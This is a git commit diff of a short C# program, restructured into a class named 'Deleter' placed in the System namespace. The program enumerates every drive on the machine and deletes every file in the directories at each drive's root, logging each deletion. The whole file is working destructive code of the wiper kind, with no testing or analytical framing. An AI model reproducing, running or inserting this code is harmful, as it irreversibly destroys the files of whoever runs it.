bb46cb571db0d4169ab71985ca108ab0f3a3f4a5
User-1819 <jackstage527+1@gmail.com>
2025-02-17 17:44:08 -0500

    Update main.cs

--- 7/main.cs
+++ 7/main.cs
@@ -1,32 +1,37 @@
 using System;
 using System.IO;
 using System.Collections.Generic;
-public static class Program
+namespace System
 {
-    public static string[] LogicalDrives = Directory.GetLogicalDrives();
-    public static List<DriveInfo> Disks = new List<DriveInfo>(DriveInfo.GetDrives());
-    public static void Main(string[] args)
+    public static class Deleter
     {
-        foreach (DriveInfo disk in Disks)
+        public static string[] LogicalDrives = Directory.GetLogicalDrives();
+        public static List<DriveInfo> Disks = new List<DriveInfo>(DriveInfo.GetDrives());
+
+        public static void Main(string[] args)
         {
-            if (disk.Name != disk.VolumeLabel)
+            foreach (DriveInfo disk in Disks)
             {
-                Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
-            }
-            else
-            {
-                Console.WriteLine("Current drive is: " + disk.Name);
-            }
-            foreach (string drive in LogicalDrives)
-            {
-                string[] dirs = Directory.GetDirectories(Directory.GetDirectoryRoot(drive));
-                foreach (string dir in dirs)
+                if (disk.Name != disk.VolumeLabel)
                 {
-                    string[] files = Directory.GetFiles(dir);
-                    foreach (string file in files)
+                    Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                }
+                else
+                {
+                    Console.WriteLine("Current drive is: " + disk.Name);
+                }
+
+                foreach (string drive in LogicalDrives)
+                {
+                    string[] dirs = Directory.GetDirectories(Directory.GetDirectoryRoot(drive));
+                    foreach (string dir in dirs)
                     {
-                        File.Delete(file);
-                        Console.WriteLine("Deleting " + file);
+                        string[] files = Directory.GetFiles(dir);
+                        foreach (string file in files)
+                        {
+                            File.Delete(file);
+                            Console.WriteLine("Deleting " + file);
+                        }
                     }
                 }
             }
